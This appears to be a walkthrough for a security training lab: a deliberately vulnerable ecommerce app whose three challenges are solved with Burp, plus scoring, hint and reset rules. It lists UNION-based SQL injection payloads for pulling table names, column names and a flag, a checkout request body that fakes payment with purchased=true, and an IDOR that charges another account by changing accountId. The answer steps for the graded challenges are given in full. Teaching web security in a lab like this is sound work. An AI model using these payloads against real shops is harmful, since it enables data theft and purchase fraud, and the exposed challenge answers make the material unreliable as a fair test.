# Lab 2 - Practical Scenario Notes (Simple: Real Logic vs Broken Logic)

This file is intentionally practical. For each scenario:
1. What real secure logic should be.
2. What is broken in the lab.
3. How to apply attack steps in Burp.
4. How challenge verification works.

---

## Overview
Lab 2 is an ecommerce target (products, category, checkout, orders, profile) plus a challenge console.

Test account:
- Username: attacker1
- Password: ShopHack123!
- account id: 1
- balance: $100

Challenge high-price product:
- productId: 777
- price: $700

---

## Endpoint Map

Auth:
- `POST /api/login`
- `GET /api/me`

Category:
- `POST /api/category/search` (param: `category`)

Checkout:
- `POST /api/checkout/preview`
- `POST /api/checkout/complete` (params: `productId`, `purchased`, `accountId`)

Progress/Flag:
- `GET /api/challenge/status`
- `POST /api/challenge/submit-flag`

Reset:
- `POST /api/reset`

---

## Scenario 1: SQLi in Category Search

## Real logic (should be)
Category filter must use prepared statements
and must never allow SQL fragments from user input.

## Broken logic (in lab)
`category` input is handled in a way that allows SQLi simulation.
You can extract tables, then columns, then secret flag data.

## How to apply with Burp (simple)
1. Capture request:
   - `POST /api/category/search`
2. Baseline body:
   - `{ "category": "electronics" }`
3. Table extraction payload:
   - `{ "category": "' UNION SELECT table_name FROM information_schema.tables --" }`
4. Column extraction payload:
   - `{ "category": "' UNION SELECT column_name FROM information_schema.columns WHERE table_name='secret' --" }`
5. Flag extraction payload:
   - `{ "category": "' UNION SELECT flag FROM secret --" }`

## Evidence of success
- Response includes flag value.

## Game verification
- Submit via:
  - `POST /api/challenge/submit-flag`
- Task1 marked done on success.

---

## Scenario 2: Buy Without Paying (Flow Manipulation)

## Real logic (should be)
Server must be the only source of payment truth,
and must not trust client-provided purchase-complete flags.

## Broken logic (in lab)
In `checkout/complete`, if request contains `purchased=true`,
server creates order without proper deduction flow.

## How to apply with Burp (simple)
1. Make preview request:
   - `POST /api/checkout/preview`
   - `{ "productId": 777 }`
2. Capture complete request:
   - `POST /api/checkout/complete`
3. Modify body to:
   - `{ "productId": 777, "purchased": true, "accountId": 1 }`
4. Send request.

## Evidence of success
- Order is created for product 777 despite insufficient balance.

## Game verification
- `GET /api/challenge/status` returns `task2: true`.

---

## Scenario 3: Buy Without Charging Your Own Account (IDOR)

## Real logic (should be)
Server must charge only account owned by current user,
and ignore account identifiers supplied by client.

## Broken logic (in lab)
Server trusts request `accountId` without strong ownership validation.
You can charge another account and still receive order on your user.

## How to apply with Burp (simple)
1. Capture `POST /api/checkout/complete`.
2. Keep `purchased=false`.
3. Change `accountId` from 1 to 10.
4. Example body:
   - `{ "productId": 777, "purchased": false, "accountId": 10 }`
5. Send request.

## Evidence of success
- Order belongs to you.
- Balance reduction happens on account 10.

## Game verification
- `GET /api/challenge/status` returns `task3: true`.

---

## Lab 2 Scoring Logic

## Task points
- Task1 (flag): +160
- Task2: +120
- Task3: +120

## Hint deduction
- 3 hints available
- each hint: -5

## Time bonus
- On finish:
  - `timeBonus = floor(remainingMinutes) * 10`

## Final formula
- `taskBonus = t1 + t2 + t3`
- `hintPenalty = usedHints * 5`
- `base = taskBonus - hintPenalty`
- `final = max(0, base + timeBonus)`

## Finish gating
- Finish button appears only when tasks are `3/3`.
- Attempt cannot be finished before that.

---

## Time, Hints, Reset

## Time
- 20 minutes from Start Attempt.
- At timeout, attempt stops.

## Hints
- Hints are guidance-style, not full direct answers.
- Point deduction applies immediately when used.

## Reset Everything
- `POST /api/reset` resets backend state
- Frontend state reset includes:
  - timer
  - score
  - hints
  - tasks
  - final panel

---

## Quick Assessor Checklist
- [ ] Task1 solved (flag accepted)
- [ ] Task2 solved (purchase without valid payment)
- [ ] Task3 solved (purchase charged to another account)
- [ ] Finish button appears only at 3/3
- [ ] Final score = task bonus + time bonus - hint penalties
